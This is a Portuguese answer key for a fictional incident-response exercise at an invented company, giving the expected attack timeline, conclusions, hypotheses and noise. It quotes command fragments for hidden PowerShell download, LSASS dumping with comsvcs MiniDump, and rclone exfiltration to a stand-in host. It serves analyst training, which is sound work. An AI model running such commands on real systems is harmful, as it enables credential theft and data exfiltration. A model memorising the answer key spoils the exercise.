# Gabarito: caso sintético (incidente FICTÍCIO)

> Não ingira este arquivo no caso nem o mostre ao revisor da revisão cruzada. Ele serve para validar o kit e treinar analistas.

Empresa fictícia **ACME** (`acme.local`, `acme.com.br`). IPs de documentação (RFC 5737), domínios `.example`. Todos os horários em UTC, em 2026-11-10.

## Ativos
| Ativo | IP | Telemetria |
|---|---|---|
| ws-fin-023 (estação do Financeiro, usuário m.silva) | 10.10.20.23 | Defender for Endpoint |
| srv-file-01 (servidor de arquivos) | 10.10.30.5 | **sem EDR**: só SecurityEvent (Sentinel), Sysmon (Splunk) e Wazuh |
| dc01 (DC/DNS) | 10.10.0.10 | logs de DNS no Elastic |
| pa-fw-01 (firewall de borda) | n/a | pan:traffic no Splunk |

## Cadeia esperada
| UTC | Fase | O quê | ATT&CK | Fonte(s) |
|---|---|---|---|---|
| 11:55:12 | (pré-condição) | svc_backup faz logon RemoteInteractive em ws-fin-023 a partir de 10.10.0.50, deixando credencial no LSASS | n/a | Defender |
| 13:02:11 | Acesso inicial | E-mail com `Fatura_88213.xlsm` entregue a m.silva | T1566.001 | Defender (EmailEvents) |
| 13:08:02 | Execução | EXCEL.EXE abre o anexo | T1204.002 | Defender |
| 13:08:19 | Execução | EXCEL.EXE → `powershell -nop -w hidden -enc` (DownloadString) | T1059.001, T1027, T1105 | Defender |
| 13:08:20–21 | C2 | DNS e conexão para cdn-update.example-cdn.net (203.0.113.45:443) | T1071.001 | Elastic, Defender, Splunk (FW) |
| 13:08:40 | Execução | `updater.exe` gravado em AppData\Roaming | T1105 | Defender |
| 13:09:05 | Persistência | `schtasks /create /tn MicrosoftEdgeUpdateTaskCore ... /sc onlogon` | T1053.005 | Defender |
| 13:15:30 | Credenciais | `rundll32 comsvcs.dll MiniDump` do LSASS → `C:\Users\Public\d.bin` | T1003.001 | Defender |
| 13:22–13:25 | Credenciais / acesso inicial (nuvem) | 3 pushes de MFA negados e depois aprovado, a partir de 198.51.100.77 (NL) | T1621, T1078.004 | Entra sign-in |
| 13:26:12 | Persistência (nuvem) | Novo método MFA registrado em m.silva a partir do IP do atacante | T1098.005 | Entra audit |
| 13:30:44 | Persistência / coleta (nuvem) | Consent OAuth para "MailSync Pro" (Mail.Read, Mail.Send) | T1528 | Entra audit |
| 13:39:50–13:40:12 | Movimentação lateral | mstsc de ws-fin-023 → srv-file-01:3389; logon tipo 10 de svc_backup | T1021.001, T1078.002 | Defender, Sentinel, Wazuh |
| 13:52:10 | Ferramental | Download de `r.zip` (rclone) de 203.0.113.45 no servidor | T1105 | Sentinel, Splunk (FW), Elastic |
| 13:57:40 | Exfiltração | `rclone copy D:\Financeiro remote:bkp` → bkp.example-storage.net (198.51.100.200) | T1567.002 | Sentinel, Splunk (Sysmon), Wazuh |
| 13:57–14:31 | Exfiltração | ~2,47 GB enviados para 198.51.100.200 | T1567.002 | Splunk (FW) |
| 14:31:05 | Defesa/evasão | Log de Segurança limpo em srv-file-01 | T1070.001 | Sentinel, Wazuh |

## Conclusões esperadas
- **Paciente zero:** ws-fin-023. **Vetor de entrada:** phishing com anexo de macro (T1566.001).
- **Contas comprometidas:** m.silva (endpoint e nuvem) e svc_backup (credencial obtida, provavelmente, do dump do LSASS: **hipótese**, porque a evidência é indireta).
- **Escopo:** ws-fin-023, srv-file-01, tenant Entra (conta m.silva e app OAuth). Dados: `D:\Financeiro` (categorias a confirmar com o dono do dado).

## Pontos que o analista precisa marcar como hipótese ou limitação
- **[HIPÓTESE]** Como o atacante obteve a **senha** de m.silva para o sign-in na nuvem. O dump do LSASS dá hashes e tickets, não a senha em claro. Alternativas: infostealer (updater.exe), phishing de credencial. Precisa de análise do updater.exe e dos logs de URL.
- **[HIPÓTESE]** A credencial de svc_backup veio do dump do LSASS. A sustentação é o logon de svc_backup na estação às 11:55, o dump às 13:15 e o uso às 13:40.
- **[LIMITAÇÃO]** srv-file-01 não tem EDR: não há visibilidade de arquivos acessados nem de memória. O log de Segurança local foi limpo às 14:31 (o que já tinha sido encaminhado ao Sentinel continua disponível).
- **[LIMITAÇÃO]** O conteúdo exato exfiltrado não está nos logs. Sabe-se o volume (FW) e a origem (`D:\Financeiro`, pela linha de comando).
- **[LIMITAÇÃO]** Não há log de caixa de correio (UAL/MailItemsAccessed) para avaliar o uso do app OAuth.

## Ruído (não malicioso)
ms-teams.exe, msedge → www.office.com, sign-in de j.souza, logon de DC01$, "Update user" do admin.ti, tráfego de 10.10.20.41.
